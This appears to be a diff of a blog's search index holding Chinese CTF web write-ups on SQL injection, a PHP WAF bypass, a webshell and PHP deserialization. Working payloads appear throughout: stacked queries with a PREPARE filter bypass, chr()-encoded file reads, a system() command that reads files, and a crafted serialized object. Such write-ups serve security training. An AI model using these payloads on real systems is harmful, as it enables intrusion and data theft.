-alt="image-20211029165116741" />
-<figcaption aria-hidden="true">image-20211029165116741</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011924048.png"
+alt="image-20211101192427994" />
+<figcaption aria-hidden="true">image-20211101192427994</figcaption>
 </figure>
-<p>堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
-<p>查出两个表的字段.</p>
-<p>观察到<code>words</code>表有两个字段<code>id</code>和<code>data</code>,
-<code>1919810931114514</code>仅有一个字段<code>flag</code>,
-猜测<strong>flag</strong>就在表<code>1919810931114514</code>中.</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
-alt="image-20211029170144998" />
-<figcaption aria-hidden="true">image-20211029170144998</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011925244.png"
+alt="image-20211101192502182" />
+<figcaption aria-hidden="true">image-20211101192502182</figcaption>
 </figure>
-<p>尝试注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
-<p>提示</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
-<p>得知有关键字审查</p>
+<p>被设了WAF, 咱也不知道是防的啥, 接着看.
+请求参数被发往<code>calc.php</code>, 我们直接访问一下看看:</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
-alt="image-20211029220716039" />
-<figcaption aria-hidden="true">image-20211029220716039</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011926659.png"
+alt="image-20211101192659620" />
+<figcaption aria-hidden="true">image-20211101192659620</figcaption>
 </figure>
-<p>采用<strong>预编译</strong>的方式绕过关键字审查, 构造注入语句:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#拆开为</span></span><br><span class="line"><span class="string">1&#x27;</span>; #闭合单引号</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #定义变量,采用CONCAT()拼接字符串绕过审查</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #预编译<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #执行编译完的<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+<p>源码直接显示出来了, 可以看到有很多过滤, 很多字符都被列入了黑名单.
+先看看能不能得到当前的文件绝对路径</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
-alt="image-20211029223621684" />
-<figcaption aria-hidden="true">image-20211029223621684</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011938789.png"
+alt="image-20211101193809717" />
+<figcaption aria-hidden="true">image-20211101193809717</figcaption>
 </figure>
-<p>提示</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>有第二道关键字审查, 由于strstr区分大小写, 而set和prepare大小写不敏感,
-故更改注入语句为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
-<p>即可绕过审查, 拿到flag</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
-alt="image-20211029223717822" />
-<figcaption aria-hidden="true">image-20211029223717822</figcaption>
-</figure>
+<p>网页直接<code>Forbidden</code>了, 经过测试,
+只要<code>num</code>的参数里含除数字以外的字符就会如此,
+这应该就是之前说的WAF了, 不绕过这个WAF后面的操作都无法进行下去.
+但是要绕过这个漏洞,
+首先要知道php在解析提交的参数名和其对应的值时都做了什么</p>
 <blockquote>
-<p>源代码</p>
+<p>PHP需要将所有参数名转换为有效键名(比如在$_REQUEST变量里的关联数组里,
+有所有提交的参数名和值)</p>
+<p>所以<code>php</code>至少会干两件事</p>
+<p>1.删除某些字符</p>
+<p>2.将某些字符转换为下划线<code>_</code></p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>以下为一些本地测试结果:</p>
+<blockquote>
+<ol type="1">
+<li>位于提交的参数前面的<code>[空格]</code>、<code>%20</code>或<code>+</code>会被删除,
+比如提交<code>param=1&amp;  param2=2(或param=1&amp;++param2=2)</code> ,
+最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","param2"=&gt;"2")</code></li>
+<li>位于提交的参数前面的<code>.</code>会被替换成<code>_</code> ,
+提交<code>param=1&amp;..param2=2</code>,
+最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","__param2"=&gt;"2")</code></li>
+<li>位于参数名中间、末尾，无论是<code>[空格]</code>、<code>+</code>、<code>%20</code>还是<code>.</code>都会被替换成<code>_</code></li>
+</ol>
+</blockquote>
+<p>这个WAF我们可以采用在num前面加个空格方式绕过, 构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47))) </span><br><span class="line">//本题calc.php?%20num=var_dump(scandir(chr(47)))亦可</span><br></pre></td></tr></table></figure>
+<p><code>scandir()</code>可以列出根目录下的文件,
+但是<code>/</code>被过滤了,
+所以用<code>chr()</code>函数,采用<code>ASCII</code>码的方式绕过</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012021640.png"
+alt="image-20211101202126567" />
+<figcaption aria-hidden="true">image-20211101202126567</figcaption>
+</figure>
+<p>根目录下有个<code>f1agg</code>,
+想必就是我们要找的<strong>flag</strong>了.</p>
+<p>故技重施, 用<code>chr()</code>函数拼出路径,
+再用<code>file_get_contents()</code>(也可以用<code>highlight_file()</code>)获取里面的内容,
+payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012031550.png"
+alt="image-20211101203110483" />
+<figcaption aria-hidden="true">image-20211101203110483</figcaption>
+</figure>
 ]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>SQL注入</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1901,6 +1901,124 @@ href="/2021/10/30/%5BWeb%5D极客大挑战-2019-LoveSQL-1/">[极客大挑战
       </tags>
   </entry>
   <entry>
+    <title>[极客大挑战 2019]Knife 1</title>
+    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1/</url>
+    <content><![CDATA[<p>看页面提示,
+就是个<code>POST</code>提交参数的<code>webshell</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311304517.png"
+alt="image-20211031130415463" />
+<figcaption aria-hidden="true">image-20211031130415463</figcaption>
+</figure>
+<p>在源码里可以找到输出结果, 然后就是传统艺能,
+到根目录去看看都有啥好玩意儿</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311331857.png"
+alt="image-20211031133142800" />
+<figcaption aria-hidden="true">image-20211031133142800</figcaption>
+</figure>
+<p><strong>flag</strong>就在这里了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syc=system(&quot;cd ../../../../../;ls -la;cat flag&quot;);</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311333863.png"
+alt="image-20211031133328805" />
+<figcaption aria-hidden="true">image-20211031133328805</figcaption>
+</figure>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[极客大挑战 2019]PHP 1</title>
+    <url>/2021/11/01/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1/</url>
+    <content><![CDATA[<p>进去看到主页是一只猫, 移动鼠标可以用毛线团逗它,
+出个题前端也也是费心了</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012309147.png"
+alt="image-20211101230918054" />
+<figcaption aria-hidden="true">image-20211101230918054</figcaption>
+</figure>
+<p>上面说, 有<strong>备份</strong>网站的习惯,
+所以我们就扫描服务器找出备份文件, 使用<code>dirsearch</code>这个脚本</p>
+<p>下载地址: <a
+href="https://github.com/maurosoria/dirsearch">Github</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ./dirsearch.py -e php -u http://0c3bed09-f748-4307-ba14-135d78a27e92.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-e 指定服务器运行环境</p>
+<p>-u 指定网站目录</p>
+</blockquote>
+<blockquote>
+<p>PS: 我自己扫了很久也没扫完, 看别人的WP扫出了<code>www.zip</code>,
+我们就从这里开始</p>
+</blockquote>
+<p>下载<code>www.zip</code>解压得到5个文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012317474.png"
+alt="image-20211101231756440" />
+<figcaption aria-hidden="true">image-20211101231756440</figcaption>
+</figure>
+<p><code>index.php</code>关键代码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>index.php</code>引入了<code>class.php</code>,
+然后反序列化参数<code>select</code>的值,
+先去看看<code>class.php</code>有什么</p>
+<blockquote>
+<p><code>flag.php</code>里的那个<strong>flag</strong>是错的</p>
+</blockquote>
+<p><code>class.php</code>代码如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里就要用到<code>php</code>反序列化的知识了,
+我们先在本地制作好payload</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012343385.png"
+alt="image-20211101234324256" />
+<figcaption aria-hidden="true">image-20211101234324256</figcaption>
+</figure>
+<p>审计代码, 用户名为<code>"admin"</code>,
+密码为<code>100</code>(<code>"100"</code>也行, 弱相等)时,
+并使<code>__wakeup()</code>不执行, 就能拿到<strong>flag</strong></p>
+<p>序列化后的对象:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>当序列化文本中指定的对象属性个数大于实际个数时,
+<code>__wakeup()</code>方法就不会被执行 ,实际上是2个, 我们改成3个:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>提交上去看看</p>
+<p><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020001866.png"
+alt="image-20211102000144789" />emmm, 跟我想的不一样</p>
+<p>经过一番查找得知:
+<code>Name</code>类的两个属性是<code>private</code>的, 只能在类中访问,
+在序列化后的文本中要用<code>%00</code>将类名和属性名分隔开,
+所以正确的序列化文本应该是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>再次提交:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020005666.png"
+alt="image-20211102000537580" />
+<figcaption aria-hidden="true">image-20211102000537580</figcaption>
+</figure>
+<p>成功拿到<strong>flag</strong></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[极客大挑战 2019]Http 1</title>
     <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1/</url>
     <content><![CDATA[<p>进去之后, 按照惯例, 先查看源代码<img
@@ -1938,41 +2056,6 @@ alt="image-20211031133804874" />
 <p><a
 href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">参考资料</a></p>
 </blockquote>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[极客大挑战 2019]Knife 1</title>
-    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1/</url>
-    <content><![CDATA[<p>看页面提示,
-就是个<code>POST</code>提交参数的<code>webshell</code></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311304517.png"
-alt="image-20211031130415463" />
-<figcaption aria-hidden="true">image-20211031130415463</figcaption>
-</figure>
-<p>在源码里可以找到输出结果, 然后就是传统艺能,
-到根目录去看看都有啥好玩意儿</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311331857.png"
-alt="image-20211031133142800" />
-<figcaption aria-hidden="true">image-20211031133142800</figcaption>
-</figure>
-<p><strong>flag</strong>就在这里了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syc=system(&quot;cd ../../../../../;ls -la;cat flag&quot;);</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311333863.png"
-alt="image-20211031133328805" />
-<figcaption aria-hidden="true">image-20211031133328805</figcaption>
-</figure>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -2060,142 +2143,6 @@ alt="image-20211030200642577" />
       <tags>
         <tag>Web安全</tag>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[极客大挑战 2019]PHP 1</title>
-    <url>/2021/11/01/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1/</url>
-    <content><![CDATA[<p>进去看到主页是一只猫, 移动鼠标可以用毛线团逗它,
-出个题前端也也是费心了</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012309147.png"
-alt="image-20211101230918054" />
-<figcaption aria-hidden="true">image-20211101230918054</figcaption>
-</figure>
-<p>上面说, 有<strong>备份</strong>网站的习惯,
-所以我们就扫描服务器找出备份文件, 使用<code>dirsearch</code>这个脚本</p>
-<p>下载地址: <a
-href="https://github.com/maurosoria/dirsearch">Github</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ./dirsearch.py -e php -u http://0c3bed09-f748-4307-ba14-135d78a27e92.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>-e 指定服务器运行环境</p>
-<p>-u 指定网站目录</p>
-</blockquote>
-<blockquote>
-<p>PS: 我自己扫了很久也没扫完, 看别人的WP扫出了<code>www.zip</code>,
-我们就从这里开始</p>
-</blockquote>
-<p>下载<code>www.zip</code>解压得到5个文件</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012317474.png"
-alt="image-20211101231756440" />
-<figcaption aria-hidden="true">image-20211101231756440</figcaption>
-</figure>
-<p><code>index.php</code>关键代码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>index.php</code>引入了<code>class.php</code>,
-然后反序列化参数<code>select</code>的值,
-先去看看<code>class.php</code>有什么</p>
-<blockquote>
-<p><code>flag.php</code>里的那个<strong>flag</strong>是错的</p>
-</blockquote>
-<p><code>class.php</code>代码如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里就要用到<code>php</code>反序列化的知识了,
-我们先在本地制作好payload</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012343385.png"
-alt="image-20211101234324256" />
-<figcaption aria-hidden="true">image-20211101234324256</figcaption>
-</figure>
-<p>审计代码, 用户名为<code>"admin"</code>,
-密码为<code>100</code>(<code>"100"</code>也行, 弱相等)时,
-并使<code>__wakeup()</code>不执行, 就能拿到<strong>flag</strong></p>
-<p>序列化后的对象:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
-<p>当序列化文本中指定的对象属性个数大于实际个数时,
-<code>__wakeup()</code>方法就不会被执行 ,实际上是2个, 我们改成3个:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
-<p>提交上去看看</p>
-<p><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020001866.png"
